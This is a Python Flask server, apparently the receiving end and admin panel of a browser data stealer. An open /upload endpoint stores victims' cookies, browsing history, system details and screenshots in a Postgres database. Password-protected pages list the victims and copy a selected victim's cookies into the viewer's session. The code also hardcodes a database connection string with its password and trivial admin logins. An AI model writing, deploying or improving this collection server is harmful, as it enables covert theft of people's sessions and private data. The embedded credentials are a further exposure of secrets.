from flask import Flask, request, render_template, session
from flask_httpauth import HTTPBasicAuth
import psycopg2, json, base64, os
from datetime import datetime

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "supersecretkey")  # Для сессий
auth = HTTPBasicAuth()

ADMINS = {"angel0chek": "angel0chek", "winter": "winter"}

@auth.verify_password
def verify(username, password):
    if username in ADMINS and ADMINS[username] == password:
        session['username'] = username
        return username
    return None

# Строка подключения к Neon
DB_URL = "postgresql://neondb_owner:npg_FK3RL4ZGAXin@ep-frosty-wildflower-af3ua5fw-pooler.c-2.us-west-2.aws.neon.tech/neondb?sslmode=require&channel_binding=require"

def get_conn():
    return psycopg2.connect(DB_URL)

def init_db():
    conn = get_conn()
    cur = conn.cursor()
    cur.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id SERIAL PRIMARY KEY,
            username TEXT,
            cookies JSONB,
            history JSONB,
            system_info JSONB,
            screenshot BYTEA,
            timestamp TIMESTAMP
        )
    ''')
    conn.commit()
    cur.close()
    conn.close()

init_db()

def dict_from_row(row):
    if not row:
        return None
    return {
        "id": row[0],
        "username": row[1],
        "cookies": row[2] or [],
        "history": row[3] or [],
        "system_info": row[4] or {},
        "screenshot": row[5],
        "timestamp": row[6].strftime("%Y-%m-%d %H:%M:%S") if row[6] else ""
    }

@app.route('/')
@auth.login_required
def admin_panel():
    conn = get_conn()
    cur = conn.cursor()
    cur.execute("SELECT id, username, timestamp FROM users ORDER BY id DESC")
    rows = cur.fetchall()
    cur.close()
    conn.close()
    users = [{"id": r[0], "username": r[1], "timestamp": r[2].strftime("%Y-%m-%d %H:%M:%S") if r[2] else ""} for r in rows]
    return render_template('admin.html', users=users)

@app.route('/user/<int:user_id>')
@auth.login_required
def view_user(user_id):
    conn = get_conn()
    cur = conn.cursor()
    cur.execute("SELECT * FROM users WHERE id=%s", (user_id,))
    row = cur.fetchone()
    cur.close()
    conn.close()
    user = dict_from_row(row)

    if user and user['cookies']:
        session['cookies'] = user['cookies']
    if user and user['history']:
        session['history'] = user['history']

    return render_template('user_detail.html', user=user)

@app.route('/upload', methods=['POST'])
def upload_data():
    data = request.json
    username = data.get('username', 'unknown')
    cookies = json.dumps(data.get('cookies', []))
    history = json.dumps(data.get('history', []))
    system_info = json.dumps(data.get('systemInfo', {}))
    screenshot = data.get('screenshot', None)
    if screenshot:
        screenshot = base64.b64decode(screenshot.split(',')[1])
    timestamp = datetime.now()

    conn = get_conn()
    cur = conn.cursor()
    cur.execute(
        "INSERT INTO users (username, cookies, history, system_info, screenshot, timestamp) VALUES (%s, %s, %s, %s, %s, %s)",
        (username, cookies, history, system_info, screenshot, timestamp)
    )
    conn.commit()
    cur.close()
    conn.close()
    return {'status': 'ok'}

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
